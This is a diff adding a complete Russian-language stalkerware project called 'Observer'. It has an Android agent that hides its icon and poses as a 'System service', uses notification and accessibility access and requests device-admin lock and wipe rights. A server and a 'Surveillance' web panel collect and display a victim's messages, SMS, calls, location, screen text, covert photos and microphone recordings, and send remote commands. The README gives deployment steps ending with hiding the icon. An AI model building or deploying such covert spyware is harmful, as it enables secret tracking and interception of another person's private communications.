+    fun hide(c: Context, on: Boolean) = c.packageManager.setComponentEnabledSetting(
+        ComponentName(c, "ru.observer.app.ui.MainActivity"),
+        if (on) PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+        else PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
+
+    fun notifAccess(c: Context) = Settings.Secure
+        .getString(c.contentResolver, "enabled_notification_listeners")?.contains(c.packageName) == true
+
+    fun a11y(c: Context) = (Settings.Secure
+        .getString(c.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: "")
+        .contains(c.packageName)
+
+    fun openNotif(c: Context) = go(c, Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
+    fun openA11y(c: Context) = go(c, Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+    fun openBattery(c: Context) = go(c, Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+        Uri.parse("package:" + c.packageName)))
+    private fun go(c: Context, i: Intent) = c.startActivity(i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+}
+===END===
+===FILE android/app/src/main/res/drawable/ic_fg.xml===
+<?xml version="1.0" encoding="utf-8"?>
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="108dp" android:height="108dp"
+    android:viewportWidth="108" android:viewportHeight="108">
+    <path android:fillColor="#4DA3FF"
+        android:pathData="M54,38c-12,0 -21,10 -25,16c4,6 13,16 25,16s21,-10 25,-16c-4,-6 -13,-16 -25,-16zM54,64a10,10 0,1 1,0 -20a10,10 0,1 1,0 20z" />
+</vector>
+===END===
+===FILE android/app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml===
+<?xml version="1.0" encoding="utf-8"?>
+<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
+    <background android:drawable="@color/ic_bg" />
+    <foreground android:drawable="@drawable/ic_fg" />
+</adaptive-icon>
+===END===
+===FILE android/app/src/main/res/values/colors.xml===
+<?xml version="1.0" encoding="utf-8"?>
+<resources><color name="ic_bg">#0B0D10</color></resources>
+===END===
+===FILE android/app/src/main/res/values/strings.xml===
+<?xml version="1.0" encoding="utf-8"?>
+<resources><string name="app_name">Системный сервис</string></resources>
+===END===
+===FILE android/app/src/main/res/values/themes.xml===
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <style name="Theme.Observer" parent="Theme.AppCompat.DayNight.NoActionBar">
+        <item name="android:windowBackground">#0B0D10</item>
+        <item name="android:statusBarColor">#0B0D10</item>
+    </style>
+</resources>
+===END===
+===FILE android/app/src/main/res/xml/a11y_service.xml===
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagReportViewIds"
+    android:canRetrieveWindowContent="true"
+    android:notificationTimeout="150" />
+===END===
+===FILE android/app/src/main/res/xml/device_admin.xml===
+<?xml version="1.0" encoding="utf-8"?>
+<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+    <uses-policies><force-lock /><wipe-data /></uses-policies>
+</device-admin>
+===END===
+===FILE android/build.gradle.kts===
+plugins {
+    id("com.android.application") version "8.7.2" apply false
+    id("org.jetbrains.kotlin.android") version "2.0.21" apply false
+    id("org.jetbrains.kotlin.plugin.compose") version "2.0.21" apply false
+    id("com.google.devtools.ksp") version "2.0.21-1.0.28" apply false
+}
+===END===
+===FILE android/gradle.properties===
+org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
+android.useAndroidX=true
+kotlin.code.style=official
+android.nonTransitiveRClass=true
+ksp.useKSP2=false
+===END===
+===FILE android/gradle/wrapper/gradle-wrapper.properties===
+distributionBase=GRADLE_USER_HOME
+distributionPath=wrapper/dists
+distributionUrl=https\://services.gradle.org/distributions/gradle-8.9-bin.zip
+zipStoreBase=GRADLE_USER_HOME
+zipStorePath=wrapper/dists
+===END===
+===FILE android/settings.gradle.kts===
+pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
+dependencyResolutionManagement {
+    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+    repositories { google(); mavenCentral() }
+}
+rootProject.name = "Observer"
+include(":app")
+===END===
+===FILE README.md===
+# Observer
+
+Агент Android + сервер + веб-панель.
+
+## 1. Сервер
+    cd server
+    cp .env.example .env
+    bash scripts/init.sh
+    nano .env            # вписать DOMAIN
+    mkdir -p dist
+    docker compose up -d --build
+
+Панель: https://ДОМЕН/panel — пароль из .env (ADMIN_PASSWORD)
+
+## 2. Код привязки
+    curl -X POST -H "X-Admin-Token: ПАРОЛЬ" https://ДОМЕН/api/codes
+
+## 3. APK
+    cd android
+    Android Studio -> Open -> Build APK(s)
+
+APK положить в server/dist/app.apk, ссылка https://ДОМЕН/app/app.apk
+
+## 4. Установка
+Открыть APK, ввести адрес сервера и код, выдать разрешения, «Скрыть иконку».
+
+## Что собирается
+Уведомления, SMS, вызовы, геолокация, текст экрана, звук, фото.
+===END===
+===FILE server/.env.example===
+DOMAIN=spy.example.com
+ADMIN_PASSWORD=CHANGE_ME
+SECRET=CHANGE_ME
+DB_PASS=CHANGE_ME
+DATABASE_URL=postgresql://obs:CHANGE_ME@db:5432/obs
+TG_TOKEN=
+TG_CHAT=
+===END===
+===FILE server/app/Dockerfile===
+FROM python:3.12-slim
+WORKDIR /app
+COPY req.txt .
+RUN pip install --no-cache-dir -r req.txt
+COPY . .
+RUN mkdir -p /data/media
+CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000", "--proxy-headers"]
+===END===
+===FILE server/app/main.py===
+import os, hmac, time, json, asyncio, secrets, hashlib
+from typing import Optional
+from fastapi import FastAPI, Header, HTTPException, UploadFile, WebSocket, WebSocketDisconnect, Depends
+from fastapi.responses import FileResponse, RedirectResponse
+from fastapi.staticfiles import StaticFiles
+from pydantic import BaseModel
+import asyncpg
+
+DB = os.environ["DATABASE_URL"]
+ADMIN = os.environ["ADMIN_PASSWORD"]
+SECRET = os.environ["SECRET"].encode()
+MEDIA = "/data/media"
+os.makedirs(MEDIA, exist_ok=True)
+os.makedirs("/srv/dist", exist_ok=True)
+os.makedirs("/srv/panel", exist_ok=True)
+
+app = FastAPI()
+pool = None
+
+class Bus:
+    def init(self): self.subs = {}
+    def sub(self, ch, ws): self.subs.setdefault(ch, set()).add(ws)
+    def unsub(self, ch, ws): self.subs.get(ch, set()).discard(ws)
+    async def pub(self, ch, data):
+        for ws in list(self.subs.get(ch, ())):
+            try: await ws.send_text(json.dumps(data))
+            except Exception: self.unsub(ch, ws)
+
+bus = Bus()
+
+@app.on_event("startup")
+async def _up():
+    global pool
+    pool = await asyncpg.create_pool(DB, min_size=1, max_size=8)
+    asyncio.create_task(keepalive())
+
+async def keepalive():
+    while True:
+        await asyncio.sleep(25)
+        for ch in list(bus.subs):
+            for ws in list(bus.subs[ch]):
+                try: await ws.send_text('{"ping":1}')
+                except Exception: bus.unsub(ch, ws)
+
+def sign(key):
+    e = int(time.time()) + 3600
+    s = hmac.new(SECRET, f"{key}:{e}".encode(), hashlib.sha256).hexdigest()[:32]
+    return f"/m/{key}?e={e}&s={s}"
+
+def admin(t: Optional[str] = Header(None, alias="X-Admin-Token")):
+    if not t or not secrets.compare_digest(t, ADMIN): raise HTTPException(401)
+
+async def device(t: Optional[str] = Header(None, alias="X-Device-Token")) -> str:
+    async with pool.acquire() as c:
+        r = await c.fetchrow("SELECT id FROM devices WHERE token=$1 AND NOT revoked", t)
+    if not r: raise HTTPException(401)
+    return str(r["id"])
+
+class Enroll(BaseModel):
+    code: str; name: str; model: str = ""; android: str = ""
+class Loc(BaseModel):
+    lat: float; lon: float; acc: float = 0; speed: float = 0
+class Ev(BaseModel):
+    kind: str; app: str = ""; contact: str = ""; title: str = ""; body: str = ""; src: str = ""
+class Login(BaseModel):
+    password: str
+
+@app.post("/api/login")
+async def login(l: Login):
+    if not secrets.compare_digest(l.password, ADMIN): raise HTTPException(401)
+    return {"token": ADMIN}
+
+@app.post("/api/enroll")
+async def enroll(e: Enroll):
+    async with pool.acquire() as c:
+        r = await c.fetchrow("SELECT code FROM codes WHERE code=$1 AND NOT used", e.code)
+        if not r: raise HTTPException(403, "код неверный")
+        await c.execute("UPDATE codes SET used=true WHERE code=$1", e.code)
+        tok = secrets.token_urlsafe(32)
+        did = await c.fetchval(
+            "INSERT INTO devices (name,model,android,token) VALUES ($1,$2,$3,$4) RETURNING id",
+            e.name, e.model, e.android, tok)
+    await bus.pub("panel", {"t": "device", "id": str(did), "name": e.name})
+    return {"device_id": str(did), "token": tok}
+
+@app.post("/api/loc")
+async def loc(l: Loc, d: str = Depends(device)):
+    async with pool.acquire() as c:
+        await c.execute("INSERT INTO events (device_id,kind,body,src) VALUES ($1,'loc',$2,'gps')",
+                        d, f"{l.lat},{l.lon}")
+        await c.execute("UPDATE devices SET last_seen=now() WHERE id=$1", d)
+    await bus.pub("panel", {"t": "loc", "device": d})
+    return {"ok": True}
+
+@app.post("/api/events")
+async def events(items: list[Ev], d: str = Depends(device)):
+    async with pool.acquire() as c:
+        for e in items:
+            await c.execute(
+                "INSERT INTO events (device_id,kind,app,contact,title,body,src) VALUES ($1,$2,$3,$4,$5,$6,$7)",
+                d, e.kind, e.app, e.contact, e.title, e.body, e.src)
+        await c.execute("UPDATE devices SET last_seen=now() WHERE id=$1", d)
+    for e in items:
+        await bus.pub("panel", {"t": "event", "device": d, "contact": e.contact, "body": e.body})
+    return {"ok": True}
+
+@app.post("/api/media")
+async def media(kind: str, file: UploadFile, dur: int = 0, d: str = Depends(device)):
+    key = f"{d}/{secrets.token_hex(8)}_{kind}"
+    full = os.path.join(MEDIA, key)
+    os.makedirs(os.path.dirname(full), exist_ok=True)
+    data = await file.read()
+    with open(full, "wb") as f: f.write(data)
+    async with pool.acquire() as c:
+        mid = await c.fetchval(
+            "INSERT INTO media (device_id,kind,path,size,dur) VALUES ($1,$2,$3,$4,$5) RETURNING id",
+            d, kind, key, len(data), dur)
+    await bus.pub("panel", {"t": "media", "device": d})
+    return {"ok": True, "id": mid}
+
+@app.get("/m/{key:path}")
+async def media_file(key: str, e: int, s: str):
+    exp = hmac.new(SECRET, f"{key}:{e}".encode(), hashlib.sha256).hexdigest()[:32]
+    if s != exp or int(e) < time.time(): raise HTTPException(403)
+    p = os.path.join(MEDIA, key)
+    if not os.path.exists(p): raise HTTPException(404)
+    if key.endswith("photo_front") or key.endswith("photo_back"):
+        mt = "image/jpeg"
+    elif key.endswith("voice"):
+        mt = "audio/wav"
+    else:
+        mt = "application/octet-stream"
+    return FileResponse(p, media_type=mt)
+
+@app.get("/api/devices", dependencies=[Depends(admin)])
+async def devices():
+    async with pool.acquire() as c:
+        rows = await c.fetch("SELECT id,name,model,last_seen,online FROM devices WHERE NOT revoked ORDER BY last_seen DESC NULLS LAST")
+    return [dict(r) for r in rows]
+
+@app.post("/api/codes", dependencies=[Depends(admin)])
+async def new_code():
+    code = secrets.token_hex(3).upper()
+    async with pool.acquire() as c:
+        await c.execute("INSERT INTO codes (code) VALUES ($1)", code)
+    return {"code": code}
+
+@app.get("/api/devices/{did}/chats", dependencies=[Depends(admin)])
+async def chats(did: str):
+    async with pool.acquire() as c:
+        rows = await c.fetch("""SELECT contact, MAX(ts) ts, COUNT(*) n,
+            (SELECT body FROM events e2 WHERE e2.device_id=$1 AND e2.contact=e.contact
+             ORDER BY ts DESC LIMIT 1) last
+            FROM events e WHERE device_id=$1 AND contact<>'' GROUP BY contact ORDER BY ts DESC""", did)
+    return [dict(r) for r in rows]
+
+@app.get("/api/devices/{did}/chat", dependencies=[Depends(admin)])
+async def chat(did: str, contact: str):
+    async with pool.acquire() as c:
+        rows = await c.fetch("SELECT id,ts,kind,title,body,src FROM events WHERE device_id=$1 AND contact=$2 ORDER BY ts ASC LIMIT 500", did, contact)
+    return [dict(r) for r in rows]
+
+@app.get("/api/devices/{did}/locations", dependencies=[Depends(admin)])
+async def locations(did: str):
+    async with pool.acquire() as c:
+        rows = await c.fetch("SELECT ts, body FROM events WHERE device_id=$1 AND kind='loc' ORDER BY ts DESC LIMIT 200", did)
+    return [dict(r) for r in rows]
+
+@app.get("/api/devices/{did}/media", dependencies=[Depends(admin)])
+async def media_list(did: str):
+    async with pool.acquire() as c:
+        rows = await c.fetch("SELECT id,ts,kind,dur,path FROM media WHERE device_id=$1 ORDER BY ts DESC LIMIT 200", did)
+    return [{"id": r["id"], "ts": r["ts"], "kind": r["kind"], "dur": r["dur"], "url": sign(r["path"])} for r in rows]
+
+@app.post("/api/devices/{did}/cmd", dependencies=[Depends(admin)])
+async def cmd(did: str, kind: str):
+    async with pool.acquire() as c:
+        cid = await c.fetchval("INSERT INTO commands (device_id,kind) VALUES ($1,$2) RETURNING id", did, kind)
+    await bus.pub(f"dev:{did}", {"id": cid, "kind": kind})
+    return {"ok": True}
+
+@app.websocket("/ws/device")
+async def ws_device(ws: WebSocket):
+    tok = ws.query_params.get("token")
+    async with pool.acquire() as c:
+        r = await c.fetchrow("SELECT id FROM devices WHERE token=$1 AND NOT revoked", tok)
+        if not r: await ws.close(); return
+        did = str(r["id"])
+        await c.execute("UPDATE devices SET online=true, last_seen=now() WHERE id=$1", did)
+    await ws.accept()
+    ch = f"dev:{did}"
+    bus.sub(ch, ws)
+    try:
+        while True: await ws.receive_text()
+    except WebSocketDisconnect: pass
+    finally:
+        bus.unsub(ch, ws)
+        async with pool.acquire() as c:
+            await c.execute("UPDATE devices SET online=false WHERE id=$1", did)
+
+@app.websocket("/ws/panel")
+async def ws_panel(ws: WebSocket):
+    t = ws.query_params.get("token")
+    if not t or t != ADMIN: await ws.close(); return
+    await ws.accept()
+    bus.sub("panel", ws)
+    try:
+        while True: await ws.receive_text()
+    except WebSocketDisconnect: pass
+    finally: bus.unsub("panel", ws)
+
+@app.get("/")
+async def root(): return RedirectResponse("/panel/")
+
+app.mount("/panel", StaticFiles(directory="/srv/panel", html=True), name="panel")
+app.mount("/app", StaticFiles(directory="/srv/dist", html=True), name="dist")
+===END===
+===FILE server/app/req.txt===
+fastapi==0.115.0
+uvicorn[standard]==0.32.0
+asyncpg==0.29.0
+python-multipart==0.0.9
+pydantic==2.9.2
+===END===
+===FILE server/app/schema.sql===
+CREATE TABLE devices (
+  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
+  name text NOT NULL,
+  model text,
+  android text,
+  token text UNIQUE NOT NULL,
+  enrolled_at timestamptz NOT NULL DEFAULT now(),
+  last_seen timestamptz,
+  online boolean NOT NULL DEFAULT false,
+  revoked boolean NOT NULL DEFAULT false
+);
+CREATE TABLE codes (
+  code text PRIMARY KEY,
+  used boolean NOT NULL DEFAULT false,
+  created_at timestamptz NOT NULL DEFAULT now()
+);
+CREATE TABLE events (
+  id bigserial PRIMARY KEY,
+  device_id uuid NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
+  ts timestamptz NOT NULL DEFAULT now(),
+  kind text NOT NULL,
+  app text DEFAULT '',
+  contact text DEFAULT '',
+  title text DEFAULT '',
+  body text DEFAULT '',
+  src text DEFAULT ''
+);
+CREATE INDEX ON events (device_id, ts DESC);
+CREATE TABLE media (
+  id bigserial PRIMARY KEY,
+  device_id uuid NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
+  ts timestamptz NOT NULL DEFAULT now(),
+  kind text,
+  path text,
+  size int,
+  dur int DEFAULT 0
+);
+CREATE TABLE commands (
+  id bigserial PRIMARY KEY,
+  device_id uuid NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
+  ts timestamptz NOT NULL DEFAULT now(),
+  kind text NOT NULL,
+  done_at timestamptz
+);
+===END===
+===FILE server/Caddyfile===
+{$DOMAIN} {
+    encode gzip
+    header Strict-Transport-Security "max-age=31536000"
+    reverse_proxy api:8000
+}
+===END===
+===FILE server/docker-compose.yml===
+services:
+  caddy:
+    image: caddy:2-alpine
+    restart: always
+    env_file: .env
+    ports: ["80:80", "443:443"]
+    volumes:
+      - ./Caddyfile:/etc/caddy/Caddyfile:ro
+      - caddy_data:/data
+    depends_on: [api]
+
+  api:
+    build: ./app
+    restart: always
+    env_file: .env
+    volumes:
+      - /mnt/vol/media:/data/media
+      - ./dist:/srv/dist:ro
+      - ./panel:/srv/panel:ro
+    depends_on: [db]
+
+  db:
+    image: postgres:16-alpine
+    restart: always
+    environment:
+      POSTGRES_USER: obs
+      POSTGRES_PASSWORD: ${DB_PASS}
+      POSTGRES_DB: obs
+    volumes:
+      - ./app/schema.sql:/docker-entrypoint-initdb.d/schema.sql:ro
+      - pgdata:/var/lib/postgresql/data
+
+  cron:
+    image: alpine:3.20
+    restart: always
+    command: >
+      sh -c "apk add --no-cache postgresql-client curl >/dev/null &&
+             echo '17 4 * * * sh /scripts/retention.sh' > /etc/crontabs/root &&
+             echo '40 3 * * * sh /scripts/backup.sh' >> /etc/crontabs/root &&
+             crond -f -l 2"
+    volumes:
+      - ./scripts:/scripts:ro
+      - /mnt/vol/media:/data/media
+      - /mnt/vol/backup:/backup
+    env_file: .env
+
+volumes:
+  caddy_data:
+  pgdata:
+===END===
+===FILE server/panel/app.js===
+const API = location.origin;
+let token = sessionStorage.getItem('tok') || '';
+let devId = '';
+let tab = 'chats';
+let ws;
+const $ = id => document.getElementById(id);
+
+async function api(path, opt) {
+  opt = opt || {};
+  opt.headers = Object.assign({ 'X-Admin-Token': token }, opt.headers || {});
+  const r = await fetch(API + path, opt);
+  if (r.status === 401) { logout(); throw new Error('401'); }
+  return r;
+}
+function logout() { sessionStorage.removeItem('tok'); location.reload(); }
+
+$('go').onclick = async () => {
+  const r = await fetch(API + '/api/login', { method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ password: $('pass').value }) });
+  if (!r.ok) { $('err').textContent = 'неверный пароль'; return; }
+  token = (await r.json()).token;
+  sessionStorage.setItem('tok', token);
+  start();
+};
+$('out').onclick = logout;
+
+async function start() {
+  $('login').hidden = true; $('app').hidden = false;
+  const devs = await (await api('/api/devices')).json();
+  $('dev').innerHTML = devs.map(d => `<option value="${d.id}">${d.name}</option>`).join('') || '<option>нет</option>';
+  devId = devs[0] ? devs[0].id : '';
+  $('dev').onchange = () => { devId = $('dev').value; draw(); };
+  $('nav').innerHTML = ['Чаты', 'Медиа', 'Карта', 'Команды'].map((n, i) => `<button data-t="${i}">${n}</button>`).join('');
+  document.querySelectorAll('[data-t]').forEach(b => b.onclick = () => { tab = +b.dataset.t; draw(); });
+  connectWs(); draw();
+}
+
+function connectWs() {
+  ws = new WebSocket(API.replace('https', 'wss') + '/ws/panel?token=' + token);
+  ws.onmessage = e => {
+    const m = JSON.parse(e.data);
+    if (m.ping) return;
+    if (m.t === 'device') return start();
+    if (m.device === devId) draw();
+  };
+  ws.onclose = () => setTimeout(connectWs, 3000);
+}
+
+async function draw() {
+  document.querySelectorAll('[data-t]').forEach(b => b.classList.toggle('on', +b.dataset.t === tab));
+  const m = $('main');
+  if (!devId) { m.innerHTML = '<p class="dim">Устройств нет</p>'; return; }
+  const st = await (await api('/api/devices')).json();
+  const cur = st.find(d => d.id === devId);
+  $('status').textContent = cur && cur.online ? 'онлайн' : 'офлайн';
+  $('status').className = 'st ' + (cur && cur.online ? 'on' : 'off');
+
+  if (tab === 0) {
+    const rows = await (await api(`/api/devices/${devId}/chats`)).json();
+    m.innerHTML = rows.map(r => `<div class="row" data-c="${encodeURIComponent(r.contact)}">
+      <div><div class="nm">${r.contact.split('|').pop()}</div>
+      <div class="dim">${r.contact.split('|')[0]} · ${r.n}</div></div></div>`).join('') || '<p class="dim">Пусто</p>';
+    document.querySelectorAll('[data-c]').forEach(el => el.onclick = () => openChat(decodeURIComponent(el.dataset.c)));
+  }
+  if (tab === 1) {
+    const items = await (await api(`/api/devices/${devId}/media`)).json();
+    m.innerHTML = '<div class="grid">' + items.map(i => `<div class="card">
+      ${i.kind.indexOf('photo') === 0 ? `<img src="${i.url}" loading="lazy">` : `<video src="${i.url}" controls preload="none"></video>`}
+      <div class="m">${i.kind}</div></div>`).join('') + '</div>';
+  }
+  if (tab === 2) {
+    const pts = await (await api(`/api/devices/${devId}/locations`)).json();
+    m.innerHTML = '<canvas id="cv"></canvas>';
+    const cv = $('cv'), ctx = cv.getContext('2d');
+    cv.width = cv.clientWidth; cv.height = 320;
+    if (!pts.length) return;
+    const co = pts.map(p => p.body.split(',').map(Number)).reverse();
+    const xs = co.map(c => c[0]), ys = co.map(c => c[1]);
+    const mnX = Math.min.apply(null, xs), mxX = Math.max.apply(null, xs);
+    const mnY = Math.min.apply(null, ys), mxY = Math.max.apply(null, ys);
+    const px = v => 20 + (v - mnX) / ((mxX - mnX) || 1) * (cv.width - 40);
+    const py = v => 20 + (v - mnY) / ((mxY - mnY) || 1) * (cv.height - 40);
+    ctx.strokeStyle = '#4da3ff'; ctx.lineWidth = 2; ctx.beginPath();
+    co.forEach((c, i) => i ? ctx.lineTo(px(c[0]), py(c[1])) : ctx.moveTo(px(c[0]), py(c[1])));
+    ctx.stroke();
+    const l = co[co.length - 1];
+    ctx.fillStyle = '#4da3ff'; ctx.beginPath(); ctx.arc(px(l[0]), py(l[1]), 5, 0, 7); ctx.fill();
+  }
+  if (tab === 3) {
+    const cmds = [['photo_front', 'Фото фронталка'], ['photo_back', 'Фото тыл'], ['mic30', 'Запись 30 с'],
+                  ['loc', 'Геопозиция'], ['lock', 'Заблокировать'], ['silent', 'Тихий режим']];
+    m.innerHTML = '<div class="cmds">' + cmds.map(c => `<button data-k="${c[0]}">${c[1]}</button>`).join('') + '</div>';
+    document.querySelectorAll('[data-k]').forEach(b => b.onclick = async () => {
+      await api(`/api/devices/${devId}/cmd?kind=${b.dataset.k}`, { method: 'POST' });
+      b.textContent = 'отправлено'; setTimeout(draw, 1200);
+    });
+  }
+}
+
+async function openChat(contact) {
+  const msgs = await (await api(`/api/devices/${devId}/chat?contact=${encodeURIComponent(contact)}`)).json();
+  $('main').innerHTML = '<button onclick="draw()">← назад</button>' +
+    msgs.map(m => `<div class="bub ${m.src === 'screen' ? 'out' : ''}">${m.body}
+      <div class="bt">${new Date(m.ts).toLocaleTimeString('ru-RU')} · ${m.src}</div></div>`).join('');
+}
+if (token) start();
+===END===
+===FILE server/panel/index.html===
+<!DOCTYPE html>
+<html lang="ru"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Наблюдение</title><link rel="stylesheet" href="style.css"></head>
+<body>
+<div id="login" class="login">
+  <h1>Наблюдение</h1>
+  <input id="pass" type="password" placeholder="пароль">
+  <button id="go">Войти</button>
+  <p id="err"></p>
+</div>
+<div id="app" hidden>
+  <header>
+    <span class="brand">НАБЛЮДЕНИЕ</span>
+    <select id="dev"></select>
+    <span id="status" class="st"></span>
+    <button id="out">Выйти</button>
+  </header>
+  <nav id="nav"></nav>
+  <main id="main"></main>
+</div>
+<script src="app.js"></script>
+</body></html>
+===END===
+===FILE server/panel/style.css===
+*{box-sizing:border-box}
+body{margin:0;font:13px/1.5 Inter,system-ui,sans-serif;background:#0b0d10;color:#c9d3de}
+.login{max-width:300px;margin:120px auto;display:flex;flex-direction:column;gap:8px;padding:20px}
+.login h1{font-size:16px;font-weight:500;color:#6f8199}
+input,select,button{font:inherit;background:#11161b;border:1px solid #26303a;color:#c9d3de;padding:8px;border-radius:5px}
+button{cursor:pointer}
+header{display:flex;gap:10px;align-items:center;padding:10px 14px;border-bottom:1px solid #1e242c;background:#0e1216}
+.brand{font-size:11px;letter-spacing:.14em;color:#6f8199}
+.st{font-size:11px;margin-left:auto}
+.on{color:#3ecf8e}.off{color:#e05555}
+nav{display:flex;border-bottom:1px solid #1e242c}
+nav button{flex:1;border:0;border-right:1px solid #1a2027;border-radius:0;background:none;color:#6f8199;padding:9px;font-size:11px}
+nav button.on{color:#7fb8ff;background:#11181f}
+main{padding:12px;max-height:calc(100vh - 90px);overflow:auto}
+.row{display:flex;gap:10px;align-items:center;padding:9px;border-radius:6px;cursor:pointer;border-bottom:1px solid #171d24}
+.nm{color:#e6eef7}.dim{color:#6f8199;font-size:10px}
+.bub{max-width:80%;padding:7px 10px;border-radius:8px;margin-bottom:7px;background:#141b22;border:1px solid #1f262e}
+.out{background:#16283a;margin-left:auto}
+.bt{font-size:9px;color:#5c6b7d;margin-top:3px}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:8px}
+.card{background:#11161b;border:1px solid #1f262e;border-radius:6px;overflow:hidden}
+.card img,.card video{width:100%;display:block}
+.card .m{padding:6px;font-size:10px;color:#6f8199}
+.cmds{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:6px}
+canvas{width:100%;height:320px;background:#0e1419;border:1px solid #1f262e}
+===END===
+===FILE server/scripts/backup.sh===
+#!/bin/sh
+set -e
+mkdir -p /backup
+pg_dump "$DATABASE_URL" | gzip > /backup/db_$(date +%F).sql.gz
+find /backup -name 'db_*.sql.gz' -mtime +14 -delete
+===END===
+===FILE server/scripts/harden.sh===
+#!/bin/sh
+set -e
+sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
+sed -i 's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
+systemctl restart ssh || systemctl restart sshd
+apt-get update && apt-get install -y ufw fail2ban unattended-upgrades
+ufw default deny incoming
+ufw default allow outgoing
+ufw allow 22/tcp
+ufw allow 80/tcp
+ufw allow 443/tcp
+ufw --force enable
+systemctl enable --now fail2ban
+===END===
+===FILE server/scripts/init.sh===
+#!/bin/sh
+set -e
+P=$(openssl rand -hex 12)
+S=$(openssl rand -hex 32)
+sed -i "s|^ADMIN_PASSWORD=.*|ADMIN_PASSWORD=$P|" .env
+sed -i "s|^SECRET=.*|SECRET=$S|" .env
+sed -i "s|^DB_PASS=.*|DB_PASS=$P|" .env
+sed -i "s|^DATABASE_URL=.*|DATABASE_URL=postgresql://obs:$P@db:5432/obs|" .env
+echo "Секреты созданы. Впишите DOMAIN."
+===END===
+===FILE server/scripts/retention.sh===
+#!/bin/sh
+set -e
+psql "$DATABASE_URL" -c "DELETE FROM events WHERE ts < now() - interval '60 days' AND kind IN ('notif','screen','sms','call','loc')"
+psql "$DATABASE_URL" -c "DELETE FROM media WHERE ts < now() - interval '30 days'"
+find /data/media -type f -mtime +30 -delete
+U=$(df /data | tail -1 | awk '{print $5}' | tr -d '%')
+if [ "$U" -gt 85 ] && [ -n "$TG_TOKEN" ]; then
+  curl -s "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -d "chat_id=$TG_CHAT&text=Диск ${U}%"
+fi
+===END===
